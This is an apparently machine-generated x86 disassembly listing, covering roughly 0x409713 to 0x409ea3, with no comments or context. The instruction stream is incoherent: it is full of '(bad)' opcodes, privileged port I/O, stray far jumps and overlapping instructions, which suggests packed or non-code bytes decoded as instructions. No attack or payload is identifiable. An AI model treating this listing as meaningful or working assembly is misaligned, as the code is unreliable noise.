  409713:	sub    eax,0x58a08193
  409718:	stc    
  409719:	mov    eax,ds:0x32d5dee4
  40971e:	pop    edx
  40971f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409720:	outs   dx,BYTE PTR ds:[esi]
  409721:	stc    
  409722:	mov    edi,DWORD PTR [ebx-0x5a]
  409725:	aam    0x8e
  409727:	aad    0xb2
  409729:	out    dx,eax
  40972a:	pop    es
  40972b:	push   ebx
  40972c:	and    esp,DWORD PTR gs:[eax+edi*8-0x2]
  409731:	mov    ds:0xebd3b45d,eax
  409736:	and    DWORD PTR [ecx-0x15],esp
  409739:	or     eax,0x181ccdc4
  40973e:	ficom  WORD PTR [ecx+0x7]
  409741:	dec    eax
  409742:	or     edx,ecx
  409744:	sbb    dh,dl
  409746:	mov    ds:0x1b7d2d47,eax
  40974b:	shl    al,cl
  40974d:	in     al,dx
  40974e:	cmp    bl,bl
  409750:	dec    ecx
  409751:	cmp    BYTE PTR [eax+0x52caea81],bh
  409757:	and    ebx,eax
  409759:	retf   
  40975a:	inc    edi
  40975b:	mov    edx,0x5a6896ef
  409760:	(bad)  
  409761:	ficomp WORD PTR [edi-0x10bd71e]
  409767:	jl     0x409755
  409769:	adc    DWORD PTR [eax+0xe],ebp
  40976c:	and    DWORD PTR [edi+ecx*4],eax
  40976f:	daa    
  409770:	jg     0x409743
  409772:	stos   DWORD PTR es:[edi],eax
  409773:	jge    0x4097b5
  409775:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409777:	xchg   esp,eax
  409778:	sbb    al,0x5
  40977a:	retf   0xb999
  40977d:	cmp    eax,0x7c4023df
  409782:	icebp  
  409783:	in     al,dx
  409784:	jbe    0x40976e
  409786:	pop    esp
  409787:	and    BYTE PTR [ebx-0x36],bl
  40978a:	in     al,dx
  40978b:	dec    edi
  40978c:	dec    ebx
  40978d:	mov    cl,0x49
  40978f:	push   esi
  409790:	outs   dx,BYTE PTR ds:[esi]
  409791:	dec    ebx
  409792:	cld    
  409793:	ror    esp,cl
  409795:	fdivr  QWORD PTR gs:[ecx+0x1e]
  409799:	fsub   QWORD PTR [eax+0x7a]
  40979c:	xchg   esp,eax
  40979d:	inc    edi
  40979e:	mov    esi,0x894f6058
  4097a3:	loope  0x4097ce
  4097a5:	inc    DWORD PTR [esp+esi*2+0x6a]
  4097a9:	ficomp WORD PTR [ecx-0x67]
  4097ac:	icebp  
  4097ad:	or     dh,BYTE PTR [edi]
  4097af:	jbe    0x40978f
  4097b1:	cmp    DWORD PTR [ecx],ebx
  4097b3:	les    edi,FWORD PTR ds:0x58b0864d
  4097b9:	jmp    0xbde6b03c
  4097be:	stc    
  4097bf:	jle    0x40977b
  4097c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097c2:	outs   dx,BYTE PTR ds:[esi]
  4097c3:	outs   dx,BYTE PTR ds:[esi]
  4097c4:	pop    ds
  4097c5:	lock mov DWORD PTR [edi+0x7e],ebp
  4097c9:	lods   eax,DWORD PTR ds:[esi]
  4097ca:	mov    esp,0x286d2b0c
  4097cf:	pusha  
  4097d0:	fsubr  QWORD PTR [edi+0x5a]
  4097d3:	hlt    
  4097d4:	mov    eax,0x90ad852e
  4097d9:	dec    edx
  4097da:	scas   al,BYTE PTR es:[edi]
  4097db:	fdiv   DWORD PTR ds:0xa0f7d91e
  4097e1:	inc    ecx
  4097e2:	test   eax,0xac363ade
  4097e7:	fistp  WORD PTR [ecx]
  4097e9:	clc    
  4097ea:	cmovg  ecx,DWORD PTR [edx]
  4097ed:	push   esp
  4097ee:	and    eax,DWORD PTR [ebp+eax*8-0x7b]
  4097f2:	mov    dh,0xba
  4097f4:	push   ds
  4097f5:	loope  0x40979d
  4097f7:	(bad)  
  4097f8:	pop    edx
  4097f9:	lods   eax,DWORD PTR ds:[esi]
  4097fa:	das    
  4097fb:	dec    ecx
  4097fc:	mov    edi,0x70463996
  409801:	imul   DWORD PTR [ebx+0x4a1109e7]
  409807:	in     al,dx
  409808:	into   
  409809:	arpl   WORD PTR [ebx],dx
  40980b:	es add ebx,edx
  40980e:	js     0x4097ca
  409810:	xor    eax,0x7b2c73c6
  409815:	mov    ah,dl
  409817:	stos   BYTE PTR es:[edi],al
  409818:	or     ah,dh
  40981a:	mov    WORD PTR [esi+0x1b],ds
  40981d:	mov    cl,0x5c
  40981f:	adc    dh,dl
  409821:	sub    BYTE PTR [ecx-0xb2e69f6],0xb5
  409828:	shr    BYTE PTR [ebx+0x6e],1
  40982b:	bound  eax,QWORD PTR [eax+0x37]
  40982e:	jle    0x409818
  409830:	push   ss
  409831:	stos   DWORD PTR es:[edi],eax
  409832:	push   eax
  409833:	jg     0x40985e
  409835:	or     al,0x76
  409837:	test   al,0x19
  409839:	leave  
  40983a:	xchg   esp,eax
  40983b:	jl     0x409806
  40983d:	sub    al,0x98
  40983f:	push   0xde0d570
  409844:	push   0x836936ff
  409849:	je     0x409805
  40984b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40984c:	test   eax,0x18e48578
  409851:	jmp    0x4098c9
  409853:	out    dx,eax
  409854:	lahf   
  409855:	jb     0x4097e4
  409857:	mov    es,WORD PTR [esi+0x2a87030d]
  40985d:	outs   dx,BYTE PTR ds:[esi]
  40985e:	fcom   QWORD PTR ds:0xa5a99b32
  409864:	test   ebx,esi
  409866:	test   BYTE PTR [eax+0x1b4810e8],dh
  40986c:	sub    eax,0x7eccc80a
  409871:	lds    ebp,FWORD PTR [edi+edi*8+0x2d507be7]
  409878:	xchg   ebx,eax
  409879:	pop    edx
  40987a:	push   ebx
  40987b:	loope  0x409800
  40987d:	push   ebp
  40987e:	mov    cl,0xfa
  409880:	mov    BYTE PTR [ebx+eax*4-0x66],al
  409884:	inc    ebp
  409885:	les    ebp,FWORD PTR [ebp-0x38]
  409888:	mov    dl,0x22
  40988a:	push   ds
  40988b:	sahf   
  40988c:	dec    esi
  40988d:	fild   QWORD PTR [ebx+edi*4+0x4f7aa3ae]
  409894:	into   
  409895:	and    bl,BYTE PTR [edx]
  409897:	inc    esi
  409898:	xor    eax,0xe7c3ecb2
  40989d:	and    BYTE PTR [esi+ebx*2],al
  4098a0:	in     al,0x82
  4098a2:	sbb    eax,0x3ae5347f
  4098a7:	push   0xffffff96
  4098a9:	aaa    
  4098aa:	mov    cs,WORD PTR [ecx+ebx*8+0x1d1a8179]
  4098b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b2:	jo     0x40991d
  4098b4:	cmp    al,0x34
  4098b6:	pop    ss
  4098b7:	push   eax
  4098b8:	xchg   ecx,eax
  4098b9:	loopne 0x409886
  4098bb:	push   0xa2bdd017
  4098c0:	stos   BYTE PTR es:[edi],al
  4098c1:	aas    
  4098c2:	imul   esi,DWORD PTR [edi+0x28],0x57
  4098c6:	inc    ebp
  4098c7:	mov    bh,0x9b
  4098c9:	jnp    0x409859
  4098cb:	inc    edi
  4098cc:	push   esi
  4098cd:	adc    eax,0xe488ab2f
  4098d2:	and    al,0x5d
  4098d4:	fwait
  4098d5:	adc    esi,edi
  4098d7:	xor    dl,BYTE PTR [eax+0x2cc9c234]
  4098dd:	add    BYTE PTR [ecx-0x2],cl
  4098e0:	sti    
  4098e1:	outs   dx,BYTE PTR ds:[esi]
  4098e2:	in     eax,0xd1
  4098e4:	sbb    DWORD PTR [edi],esi
  4098e6:	pop    ebp
  4098e7:	inc    esp
  4098e8:	pop    ss
  4098e9:	jge    0x409909
  4098eb:	mov    dh,BYTE PTR [esi]
  4098ed:	mov    dh,0x98
  4098ef:	es icebp 
  4098f1:	test   DWORD PTR [esi+0x7bec9276],0x5322d41c
  4098fb:	nop
  4098fc:	dec    eax
  4098fd:	and    al,0x63
  4098ff:	sbb    BYTE PTR [ebx-0x37],dh
  409902:	icebp  
  409903:	inc    ecx
  409904:	mov    WORD PTR [ecx+edx*8+0x65eaebfd],cs
  40990b:	fistp  WORD PTR [edx+0x56]
  40990e:	jo     0x4098bb
  409910:	in     eax,dx
  409911:	mov    dl,0x22
  409913:	cmp    al,0x29
  409915:	pop    ecx
  409916:	cmp    ecx,edi
  409918:	std    
  409919:	adc    al,0x3
  40991b:	jge    0x4098ab
  40991d:	sbb    DWORD PTR [edx-0x29],edi
  409920:	push   edx
  409921:	test   BYTE PTR [ecx+0x76bd72b],cl
  409927:	mov    ss,WORD PTR [ebx-0x671b4e66]
  40992d:	retf   
  40992e:	jb     0x4098d6
  409930:	cmp    DWORD PTR [edi],esp
  409932:	push   esi
  409933:	sar    DWORD PTR [esi+0x2148d599],0x77
  40993a:	push   ebp
  40993b:	cmp    dl,dl
  40993d:	jmp    0x4098e8
  40993f:	enter  0xdf62,0xc0
  409943:	outs   dx,DWORD PTR ds:[esi]
  409944:	or     ebp,DWORD PTR [ebx+0x65541d41]
  40994a:	pop    es
  40994b:	js     0x409944
  40994d:	in     eax,dx
  40994e:	inc    esi
  40994f:	sub    DWORD PTR [ebp+0x43],edx
  409952:	dec    ebx
  409953:	leave  
  409954:	sbb    al,0x3e
  409956:	jne    0x40998b
  409958:	mov    al,ds:0x8907261c
  40995d:	test   al,0x14
  40995f:	ret    0xba70
  409962:	lds    ebx,FWORD PTR [ecx]
  409964:	mov    edx,esi
  409966:	xor    ah,0xea
  409969:	ret    
  40996a:	shr    DWORD PTR [ebp+0x64],cl
  40996d:	call   0xc8200c69
  409972:	dec    ebp
  409973:	in     eax,dx
  409974:	sub    DWORD PTR [ebp+0x44],esi
  409977:	addr16 push ss
  409979:	dec    esi
  40997a:	or     DWORD PTR [edi+0x336db7bc],edi
  409980:	pusha  
  409981:	cmp    esi,DWORD PTR [ecx]
  409983:	mov    eax,0x1718a0d1
  409988:	out    dx,al
  409989:	jmp    0x4099c7
  40998b:	je     0x40996c
  40998d:	jb     0x4099e4
  40998f:	pop    edi
  409990:	or     DWORD PTR [edx-0x4a],edx
  409993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409994:	or     edx,DWORD PTR [esi-0x2e]
  409997:	test   DWORD PTR [esi],edi
  409999:	std    
  40999a:	aad    0x58
  40999c:	mov    ch,0x22
  40999e:	pop    ebp
  40999f:	sub    BYTE PTR [ecx+0x74df3575],bh
  4099a5:	dec    ebp
  4099a6:	xor    bh,dl
  4099a8:	sbb    eax,0xd80816a9
  4099ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ae:	test   eax,0x9472b9bb
  4099b3:	mov    ds:0x1e71b3be,al
  4099b8:	repz xor BYTE PTR [ebx],0x2b
  4099bc:	(bad)  
  4099bd:	(bad)  
  4099be:	cwde   
  4099bf:	xor    al,0x65
  4099c1:	in     eax,dx
  4099c2:	pop    es
  4099c3:	pop    ebp
  4099c4:	scas   eax,DWORD PTR es:[edi]
  4099c5:	push   0x302cab77
  4099ca:	cli    
  4099cb:	xlat   BYTE PTR ds:[ebx]
  4099cc:	push   edi
  4099cd:	xchg   ebx,eax
  4099ce:	xchg   esp,eax
  4099cf:	adc    BYTE PTR [ebx+0x59e292ba],al
  4099d5:	cmp    DWORD PTR ds:0xbb00fe7c,0xffffff95
  4099dc:	in     eax,0x5
  4099de:	xchg   ecx,eax
  4099df:	mov    bl,bh
  4099e1:	into   
  4099e2:	fnstsw WORD PTR [ebx-0x2ad326df]
  4099e8:	shr    DWORD PTR [esi+0x3c88d789],1
  4099ee:	sub    al,0x9c
  4099f0:	mov    ds,WORD PTR [ecx-0x7c]
  4099f3:	inc    edx
  4099f4:	adc    eax,0xb2c0d97e
  4099f9:	jne    0x409a2c
  4099fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099fc:	or     eax,0x4047f78c
  409a01:	popf   
  409a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a03:	lea    edx,[eax]
  409a05:	mov    dh,0x98
  409a07:	(bad)  
  409a08:	or     al,0xfd
  409a0a:	(bad)  
  409a0b:	iret   
  409a0c:	cmp    dh,BYTE PTR [edx]
  409a0e:	sub    dl,al
  409a10:	scas   al,BYTE PTR es:[edi]
  409a11:	xchg   edi,eax
  409a12:	add    dh,cl
  409a14:	mov    esp,0x162dbb42
  409a19:	aaa    
  409a1a:	(bad)  
  409a1b:	gs mov eax,0xfa1c7971
  409a21:	xor    cl,BYTE PTR [edi]
  409a23:	sbb    dl,bh
  409a25:	retf   
  409a26:	gs inc eax
  409a28:	popa   
  409a29:	imul   esi,eax,0xe6cf229a
  409a2f:	mov    ss,WORD PTR [edx+edx*2]
  409a32:	in     eax,dx
  409a33:	pop    ebx
  409a34:	ror    BYTE PTR [ebx],1
  409a36:	test   DWORD PTR [ebx-0x48cc096e],edi
  409a3c:	mov    ah,ch
  409a3e:	add    al,0x3
  409a40:	ss scas al,BYTE PTR es:[edi]
  409a42:	push   eax
  409a43:	sbb    al,0x99
  409a45:	hlt    
  409a46:	out    0xaf,eax
  409a48:	xor    al,0x4
  409a4a:	pop    eax
  409a4b:	aad    0xde
  409a4d:	ret    
  409a4e:	retf   
  409a4f:	cmc    
  409a50:	xor    al,0x30
  409a52:	ja     0x409a38
  409a54:	clc    
  409a55:	fbstp  TBYTE PTR ds:0xb48df345
  409a5b:	lahf   
  409a5c:	mov    ebx,0xe20a2b97
  409a61:	sar    BYTE PTR [edx-0x3806235f],0xd6
  409a68:	aam    0xf5
  409a6a:	(bad)  
  409a6b:	sbb    esi,DWORD PTR [edi+ebx*8]
  409a6e:	stos   BYTE PTR es:[edi],al
  409a6f:	ret    0x1610
  409a72:	or     al,0xed
  409a74:	je     0x409a7b
  409a76:	dec    edi
  409a77:	cli    
  409a78:	nop
  409a79:	popa   
  409a7a:	or     eax,ecx
  409a7c:	xor    eax,edx
  409a7e:	jne    0x409a6b
  409a80:	mov    esi,0x9542fc61
  409a85:	adc    al,BYTE PTR [bp+0x125d]
  409a8a:	outs   dx,BYTE PTR ds:[esi]
  409a8b:	cmc    
  409a8c:	sub    dl,ch
  409a8e:	fistp  QWORD PTR [edx+0x2ed29cc7]
  409a94:	cmp    ch,bh
  409a96:	add    BYTE PTR es:[ebx],dh
  409a99:	fisttp QWORD PTR [esi]
  409a9b:	hlt    
  409a9c:	in     al,dx
  409a9d:	jp     0x409a84
  409a9f:	(bad)  [ecx+0x48a8b050]
  409aa5:	xor    dl,bh
  409aa7:	inc    esi
  409aa8:	mov    esp,0x4c381092
  409aad:	sbb    eax,0xa8aead2e
  409ab2:	dec    ebp
  409ab3:	jno    0x409acd
  409ab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab6:	sub    ebp,DWORD PTR [eax]
  409ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ab9:	inc    eax
  409aba:	mov    edx,0x95e2f8e5
  409abf:	adc    DWORD PTR [ebp-0x7b],eax
  409ac2:	mov    dl,0x61
  409ac4:	push   0xb672d13a
  409ac9:	lods   al,BYTE PTR ds:[esi]
  409aca:	mov    bl,0x4e
  409acc:	add    eax,0x3d31202a
  409ad1:	test   al,0xea
  409ad3:	inc    ebp
  409ad4:	sub    dl,BYTE PTR [ebx-0x4d]
  409ad7:	fistp  QWORD PTR [ecx+0x47c52f7c]
  409add:	jae    0x409a94
  409adf:	jb     0x409b3d
  409ae1:	jmp    0x409ac7
  409ae3:	shr    BYTE PTR [eax+edx*2-0x7f],1
  409ae7:	jae    0x409ad3
  409ae9:	cmp    al,0x4
  409aeb:	jnp    0x409ad1
  409aed:	cmc    
  409aee:	jl     0x409b45
  409af0:	adc    eax,0xe97df007
  409af5:	imul   eax,DWORD PTR [esi],0xbc629924
  409afb:	(bad)  
  409afc:	sub    eax,0x1c048d18
  409b01:	inc    edi
  409b02:	pusha  
  409b03:	sbb    BYTE PTR [ecx-0x64],dh
  409b06:	xor    ecx,ecx
  409b08:	sub    eax,DWORD PTR [ebx+ebp*8-0xa]
  409b0c:	in     al,dx
  409b0d:	rol    BYTE PTR [ecx+ebp*8-0x56f81614],0x3c
  409b15:	xor    eax,0xffb5d39b
  409b1a:	cli    
  409b1b:	inc    edi
  409b1c:	out    0x5b,eax
  409b1e:	dec    ebx
  409b1f:	sbb    eax,0x90418848
  409b24:	inc    esi
  409b25:	retf   0xc6fb
  409b28:	adc    DWORD PTR [ebp-0x5],esi
  409b2b:	mov    esi,0x44296e92
  409b30:	mov    edx,0x85557295
  409b35:	sahf   
  409b36:	cmp    eax,0x1d507224
  409b3b:	mov    eax,ds:0x6cef1df1
  409b40:	xchg   ebp,eax
  409b41:	xor    ah,BYTE PTR [esp+ebp*8-0x2786cfe3]
  409b48:	or     BYTE PTR [ecx-0x25c6366f],bh
  409b4e:	mov    esi,0xb9ad5c2
  409b53:	addr16 dec esi
  409b55:	inc    edx
  409b56:	adc    BYTE PTR gs:[edi-0x42d3819],ch
  409b5d:	data16 (bad) [esi+0x340d5f61]
  409b65:	outs   dx,BYTE PTR ds:[esi]
  409b66:	cmp    al,0xec
  409b68:	xor    BYTE PTR [ebx+0x60],dh
  409b6b:	push   ebp
  409b6c:	loope  0x409aef
  409b6e:	in     eax,0x8f
  409b70:	pusha  
  409b71:	mov    edi,0xa700822b
  409b76:	call   0xb88cefd8
  409b7b:	int3   
  409b7c:	mov    ebp,0xf43c5b99
  409b81:	sbb    ebx,DWORD PTR [ebx+0x3b]
  409b84:	in     eax,dx
  409b85:	or     DWORD PTR [edi+eiz*2],eax
  409b88:	jne    0x409b64
  409b8a:	and    eax,0xc0305829
  409b8f:	icebp  
  409b90:	mov    dh,0x95
  409b92:	(bad)  
  409b93:	lods   al,BYTE PTR ds:[esi]
  409b94:	pop    ecx
  409b95:	je     0x409bbc
  409b97:	cs out 0x28,al
  409b9a:	push   esp
  409b9b:	mov    ebp,esi
  409b9d:	shr    dl,0x6e
  409ba0:	mov    al,ds:0x3a71ac43
  409ba5:	dec    eax
  409ba6:	pop    ds
  409ba7:	jnp    0x409bd5
  409ba9:	jbe    0x409be0
  409bab:	sbb    ebx,edi
  409bad:	adc    DWORD PTR [esi-0x5b5e7d46],ecx
  409bb3:	inc    esi
  409bb4:	adc    al,0xcf
  409bb6:	and    eax,0xad92904c
  409bbb:	sub    al,0x34
  409bbd:	in     eax,0x6b
  409bbf:	adc    ebp,DWORD PTR [ecx+0x407fd45a]
  409bc5:	inc    eax
  409bc6:	jns    0x409c0f
  409bc8:	iret   
  409bc9:	jno    0x409bbc
  409bcb:	and    esi,DWORD PTR [edi+ebx*4]
  409bce:	add    bh,ah
  409bd0:	pop    ebp
  409bd1:	loope  0x409b67
  409bd3:	dec    ebx
  409bd4:	aad    0x77
  409bd6:	cmp    al,0xf0
  409bd8:	jnp    0x409c16
  409bda:	xor    BYTE PTR [ebp-0x13],0x2
  409bde:	or     eax,0x51512f16
  409be3:	mov    al,0x3e
  409be5:	dec    ecx
  409be6:	mov    eax,ds:0x492c8b18
  409beb:	jl     0x409bea
  409bed:	pop    ebp
  409bee:	fs or  al,0x35
  409bf1:	and    eax,0xd879c131
  409bf6:	cmp    eax,0x8312b526
  409bfb:	daa    
  409bfc:	outs   dx,DWORD PTR ds:[esi]
  409bfd:	daa    
  409bfe:	xchg   esp,eax
  409bff:	cmp    cl,BYTE PTR [ecx+eiz*8+0x1942405b]
  409c06:	adc    eax,0x295e4032
  409c0b:	jb     0x409c0e
  409c0d:	sub    ebp,DWORD PTR [ecx]
  409c0f:	add    eax,0x54492ada
  409c14:	cmp    al,0x2f
  409c16:	add    cl,dh
  409c18:	pop    esi
  409c19:	dec    ebx
  409c1a:	xor    ebx,DWORD PTR [esi]
  409c1c:	popf   
  409c1d:	mov    al,0xa6
  409c1f:	cmp    ch,ch
  409c21:	xchg   edi,eax
  409c22:	ds mov esp,0xd37c7c95
  409c28:	push   edx
  409c29:	xchg   DWORD PTR [ecx],edx
  409c2b:	fs iret 
  409c2d:	mov    bl,0x36
  409c2f:	lods   eax,DWORD PTR ds:[esi]
  409c30:	push   ecx
  409c31:	dec    ebx
  409c32:	add    edx,DWORD PTR [edi+esi*2]
  409c35:	jecxz  0x409bcd
  409c37:	mov    dh,0x6a
  409c39:	dec    edi
  409c3a:	or     dl,BYTE PTR [ebp+0x1e]
  409c3d:	ret    
  409c3e:	xchg   edx,eax
  409c3f:	ins    BYTE PTR es:[edi],dx
  409c40:	adc    al,0xb8
  409c42:	add    BYTE PTR [edx],bl
  409c44:	push   ebp
  409c45:	mov    fs,WORD PTR [eax]
  409c47:	mov    bh,BYTE PTR [edi]
  409c49:	pop    DWORD PTR [eax+0x10f8c05f]
  409c4f:	or     esi,DWORD PTR [edi-0x6f]
  409c52:	xchg   dl,cl
  409c54:	fisubr WORD PTR ds:[ecx-0x2d]
  409c58:	loope  0x409c60
  409c5a:	(bad)  
  409c5b:	loopne 0x409cc3
  409c5d:	mov    BYTE PTR [ecx+0x15],al
  409c60:	adc    al,bl
  409c62:	sahf   
  409c63:	jnp    0x409ca9
  409c65:	mov    gs,WORD PTR [eax+0x4b46c99e]
  409c6b:	ret    
  409c6c:	inc    ebx
  409c6d:	popf   
  409c6e:	fcom   QWORD PTR [ebp-0x11d2f725]
  409c74:	xchg   DWORD PTR [esp+ecx*4+0x12],edx
  409c78:	sbb    al,0x3f
  409c7a:	leave  
  409c7b:	adc    DWORD PTR [edx],0xfffffff9
  409c7e:	add    esi,DWORD PTR [eax]
  409c80:	mov    esi,0xc4b7aec6
  409c85:	xor    ecx,DWORD PTR [esi]
  409c87:	je     0x409c68
  409c89:	repz fisubr DWORD PTR [eax-0x5c910545]
  409c90:	dec    ecx
  409c91:	imul   ebp,DWORD PTR [eax],0x4b686686
  409c97:	ficom  WORD PTR ds:0x361816a9
  409c9d:	call   0x99affa9
  409ca2:	and    cl,BYTE PTR [ebx+0x5d]
  409ca5:	int3   
  409ca6:	cmp    al,BYTE PTR [ebx-0x72]
  409ca9:	cli    
  409caa:	mov    ebp,0x3e8e2b0d
  409caf:	aam    0xb2
  409cb1:	push   cs
  409cb2:	sub    BYTE PTR [edi+0xc],0x25
  409cb6:	inc    esp
  409cb7:	cmp    ebx,edi
  409cb9:	lahf   
  409cba:	imul   ebp,DWORD PTR [edx],0x4f753c7f
  409cc0:	cmp    al,bl
  409cc2:	jg     0x409cf7
  409cc4:	stc    
  409cc5:	pop    ebx
  409cc6:	addr16 inc eax
  409cc8:	sbb    eax,0xcac1d9d8
  409ccd:	scas   eax,DWORD PTR es:[edi]
  409cce:	(bad)  
  409ccf:	fdiv   QWORD PTR [edx+0x75]
  409cd2:	call   0xd955:0x5a1a1de7
  409cd9:	xchg   ecx,eax
  409cda:	add    al,0x51
  409cdc:	in     al,0xc0
  409cde:	or     al,0x80
  409ce0:	cmp    al,BYTE PTR ds:0x749dc3d8
  409ce6:	push   0x78
  409ce8:	sub    bh,BYTE PTR [ecx+ecx*4]
  409ceb:	out    0x3f,eax
  409ced:	das    
  409cee:	jmp    DWORD PTR [edi]
  409cf0:	bound  edi,QWORD PTR [esp+ecx*2-0x347b91dd]
  409cf7:	xor    al,0x5e
  409cf9:	mov    edx,0x3d82ca03
  409cfe:	mov    bh,BYTE PTR [ebx]
  409d00:	fcom   QWORD PTR [edx+0x12703ad8]
  409d06:	xor    BYTE PTR es:[ebx-0x1],dh
  409d0a:	repnz shr DWORD PTR [bx+di-0x63],cl
  409d0f:	push   ss
  409d10:	sub    bl,ah
  409d12:	jecxz  0x409cb2
  409d14:	imul   eax,DWORD PTR [ecx],0xfffffff1
  409d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d18:	sub    cl,BYTE PTR [ecx+0x670ca5ae]
  409d1e:	out    0x78,al
  409d20:	stc    
  409d21:	outs   dx,DWORD PTR ds:[esi]
  409d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d23:	in     al,0xf5
  409d25:	xchg   edi,eax
  409d26:	mov    bh,0x99
  409d28:	icebp  
  409d29:	popa   
  409d2a:	scas   al,BYTE PTR es:[edi]
  409d2b:	xor    ebp,edx
  409d2d:	adc    eax,0xad1037b8
  409d32:	dec    edi
  409d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d34:	mov    ds:0xa2e8626d,eax
  409d39:	add    dh,BYTE PTR [ebp+0x189f5531]
  409d3f:	push   esp
  409d40:	je     0x409db0
  409d42:	iret   
  409d43:	xor    al,0xd2
  409d45:	fwait
  409d46:	mov    ds:0x402851b9,al
  409d4b:	jp     0x409d04
  409d4d:	test   BYTE PTR [ecx-0x8],cl
  409d50:	sbb    eax,0x8651fc29
  409d55:	shl    BYTE PTR [edi-0x19],0x20
  409d59:	out    0x90,al
  409d5b:	cmp    ebp,edi
  409d5d:	xchg   edx,eax
  409d5f:	mov    bh,0xd9
  409d61:	neg    BYTE PTR [ecx-0x6e]
  409d64:	cli    
  409d65:	adc    dl,dh
  409d67:	mov    al,0x9d
  409d69:	xor    esp,ecx
  409d6b:	push   ds
  409d6c:	inc    edx
  409d6d:	push   edi
  409d6e:	dec    ebx
  409d6f:	sub    eax,0x978451f1
  409d74:	adc    BYTE PTR [ecx-0x2c],ah
  409d77:	dec    ebp
  409d78:	loopne 0x409d8c
  409d7a:	fwait
  409d7b:	mov    esp,ecx
  409d7d:	fnsave [ebp+eiz*2-0x48]
  409d81:	in     al,dx
  409d82:	aas    
  409d83:	test   eax,0x8b30e74f
  409d88:	push   ss
  409d89:	lods   eax,DWORD PTR ds:[esi]
  409d8a:	xor    DWORD PTR [edi+0x78d5807c],esp
  409d90:	xor    bl,BYTE PTR [edx]
  409d92:	and    dl,ah
  409d94:	jmp    0x1d0c:0x4d9e45da
  409d9b:	sti    
  409d9c:	jg     0x409daa
  409d9e:	mov    bh,0x80
  409da0:	lahf   
  409da1:	push   ebx
  409da2:	fimul  DWORD PTR [edi+0x73378f77]
  409da8:	xlat   BYTE PTR ds:[ebx]
  409da9:	jp     0x409d99
  409dab:	outs   dx,DWORD PTR ds:[esi]
  409dac:	sahf   
  409dad:	or     ecx,DWORD PTR [edx]
  409daf:	mov    esi,0x8dd9a0db
  409db4:	mov    ecx,0xebaecf
  409db9:	pop    eax
  409dba:	xchg   esi,eax
  409dbb:	lods   al,BYTE PTR ds:[esi]
  409dbc:	jmp    0x74d5:0x8364095f
  409dc3:	push   ds
  409dc4:	jp     0x409d46
  409dc6:	popf   
  409dc7:	mov    cl,0xd0
  409dc9:	sbb    ah,dh
  409dcb:	cmp    eax,0x5b4ea36c
  409dd0:	adc    BYTE PTR [eax-0x5d],bl
  409dd3:	enter  0xc646,0x1b
  409dd7:	inc    eax
  409dd8:	mov    ch,0x4e
  409dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ddb:	test   eax,0xe68f5df1
  409de0:	in     al,0x2c
  409de2:	enter  0xb045,0x35
  409de6:	sub    al,0x3e
  409de8:	jge    0x409dd0
  409dea:	add    BYTE PTR [esi-0x67],cl
  409ded:	(bad)  
  409dee:	aaa    
  409def:	xchg   edx,eax
  409df0:	pop    ecx
  409df1:	dec    ebp
  409df2:	fild   QWORD PTR [edi+0x7cdaff02]
  409df8:	cli    
  409df9:	(bad)  
  409dfa:	cmp    al,0xc0
  409dfc:	jmp    0xd1c344e6
  409e01:	adc    bh,BYTE PTR [esi+0x1d707bfa]
  409e07:	fidivr WORD PTR [esi]
  409e09:	mov    BYTE PTR [esi+0x57],al
  409e0c:	xor    esp,DWORD PTR [ecx-0x60]
  409e0f:	sub    eax,0xb526430c
  409e14:	push   esp
  409e15:	fs cmp eax,0x3e661b13
  409e1b:	or     edx,DWORD PTR [ecx-0x69]
  409e1e:	mov    edx,0xa65521b5
  409e23:	popf   
  409e24:	stos   BYTE PTR es:[edi],al
  409e25:	xchg   DWORD PTR [ebx-0x36],esp
  409e28:	jp     0x409e00
  409e2a:	xchg   edx,eax
  409e2b:	dec    ebx
  409e2c:	sbb    eax,0x2cd9419
  409e31:	cwde   
  409e32:	cmp    DWORD PTR [eax],0x1e
  409e35:	sbb    cl,BYTE PTR [ecx+edi*2]
  409e38:	loop   0x409dfb
  409e3a:	inc    eax
  409e3b:	js     0x409e93
  409e3d:	lds    ebx,FWORD PTR [ebp+0x5491da57]
  409e43:	fs jmp 0xc5637f1
  409e49:	imul   ecx,DWORD PTR [edi+0x203ba62e],0x2730afbb
  409e53:	rcr    DWORD PTR [edi+0x7c43b757],cl
  409e59:	xchg   bh,bl
  409e5b:	pop    ecx
  409e5c:	lods   al,BYTE PTR ds:[esi]
  409e5d:	sti    
  409e5e:	or     BYTE PTR [eax+0xb],dh
  409e61:	clc    
  409e62:	jne    0x409e2e
  409e64:	inc    ebx
  409e65:	xchg   edi,eax
  409e66:	mov    ?,edx
  409e68:	pop    ss
  409e69:	jp     0x409ea2
  409e6b:	dec    ecx
  409e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e6d:	xchg   ebx,eax
  409e6e:	xchg   edi,eax
  409e6f:	jmp    0x409e74
  409e71:	(bad)  
  409e72:	int    0x96
  409e74:	(bad)
  409e78:	nop
  409e79:	pop    eax
  409e7a:	popa   
  409e7b:	call   0x1923:0x8b462f8e
  409e82:	dec    ebp
  409e83:	pop    ss
  409e84:	popa   
  409e85:	inc    esp
  409e86:	jmp    0x801c9d74
  409e8b:	nop
  409e8c:	scas   al,BYTE PTR es:[edi]
  409e8d:	popa   
  409e8e:	call   0x71d174c8
  409e93:	mov    al,0xab
  409e95:	sbb    dl,BYTE PTR [edx]
  409e97:	sar    al,1
  409e99:	shl    DWORD PTR [eax+0x30],cl
  409e9c:	push   0x6e
  409e9e:	mov    ah,BYTE PTR [esi-0x4]
  409ea1:	dec    si
  409ea3:	and    BYTE PTR [eax+0x1c],bl
